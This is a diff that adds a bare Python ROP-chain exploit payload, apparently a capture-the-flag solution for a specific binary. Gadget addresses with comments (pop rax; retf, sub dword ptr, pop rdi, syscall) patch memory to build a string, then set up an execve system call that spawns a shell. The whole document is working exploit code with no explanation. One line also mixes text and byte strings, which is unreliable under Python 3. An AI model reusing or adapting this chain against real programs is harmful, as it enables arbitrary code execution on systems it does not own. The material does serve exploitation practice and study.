@@ -1,0 +1,23 @@
+payload = p64(0x402d53)
+#0x402d53: pop rax ; retf
+payload += p64(0x91969dd1)+p32(0x4017d1)+p32(0x33)
+# 0x00000000004017d1: pop rsi; pop r15; ret; 
+payload += p64(0xffffffffc35f206f)+p64(0x0)+p64(0x455f2e)
+# 0x0000000000455f2e: sub dword ptr [rsi + 0x3ce80001], eax; ret; 
+payload += p64(0x402d53)
+# 0x402d53: pop rax ; retf
+payload += p64(0xff9799d1)+p32(0x4017d1)+p32(0x33)
+# 0x00000000004017d1: pop rsi; pop r15; ret; 
+payload += p64(0xffffffffc35f2073)+p64(0x0)+p64(0x455f2e)
+# 0x0000000000455f2e: sub dword ptr [rsi + 0x3ce80001], eax; ret; 
+payload += p64(0x402d53)
+# 0x402d53: pop rax ; retf
+payload += p64(0x3b)+p32(0x4596cd)+p32(0x33)
+# 0x4596cd: pop rdx ; retf 1
+payload += p64(0x0)+p32(0x4017d3)+p32(0x33)+"\x00"*1
+# 0x00000000004017d3: pop rdi; ret; 
+payload += p64(0x472070)+p64(0x4017d1)
+# 0x00000000004017d1: pop rsi; pop r15; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x4586a6)
+# 0x00000000004586a6: syscall; 
+payload += b''
